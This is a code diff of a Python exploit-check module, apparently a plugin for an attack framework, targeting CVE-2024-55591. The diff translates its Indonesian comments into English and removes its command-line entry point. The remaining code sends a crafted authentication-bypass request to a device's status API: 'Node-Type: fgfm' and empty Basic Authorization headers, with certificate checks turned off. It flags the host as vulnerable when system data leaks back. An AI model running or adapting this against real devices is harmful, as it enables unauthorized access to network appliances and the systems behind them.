@@ -1,9 +1,8 @@
 import requests
 import urllib3
+import sys
 
-# Mematikan peringatan SSL karena biasanya router pakai sertifikat self-signed
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
 REQUIRED_OPTIONS = {"URL": ""}
 
 
@@ -12,24 +11,23 @@ def execute(options):
     target = options.get("URL")
     port = 443
 
-    print(f"[*] Testing CVE-2024-55591 on https://{target}:{port}...")
-
-    # URL target yang rentan (biasanya endpoint API monitor)
+    print(f"[*] Testing CVE-2024-55591 on https://{target}:{port}")
+    
     url = f"https://{target}:{port}/api/v2/monitor/system/status"
 
-    # 'Magic Header' yang membocorkan otentikasi
-    # Penyerang memanipulasi header agar Node.js menganggap user sudah login
+    # 'Magic Header' which leaks authentication
+    # The attacker manipulates the header to make Node.js think the user is logged in.
     headers = {
         "User-Agent": "Mozilla/5.0",
         "Node-Id": "1",
-        "Node-Type": "fgfm",  # Ini kunci bypassnya
-        "Authorization": "Basic Og==",  # Payload kosong yang memicu bug
+        "Node-Type": "fgfm",
+        "Authorization": "Basic Og==",
     }
 
     try:
         response = requests.get(url, headers=headers, verify=False, timeout=10)
 
-        # Jika responnya 200 OK dan berisi data sistem, berarti bypass berhasil!
+        # If the response is 200 OK and contains system data, the bypass was successful.!
         if response.status_code == 200 and "version" in response.text.lower():
             print(f"{'='*40}")
             print(f"[!] VULNERABLE: {target}")
@@ -41,12 +39,4 @@ def execute(options):
             print("[-] Target not vulnerable or patched.")
 
     except Exception as e:
-        print(f"[-] Error connecting: {e}")
-
-
-# Agar bisa dipanggil oleh handler Storm kamu
-if __name__ == "__main__":
-    import sys
-
-    if len(sys.argv) > 1:
-        execute(sys.argv[1])
+        print(f"[-] GLOBAL ERROR: {e}")
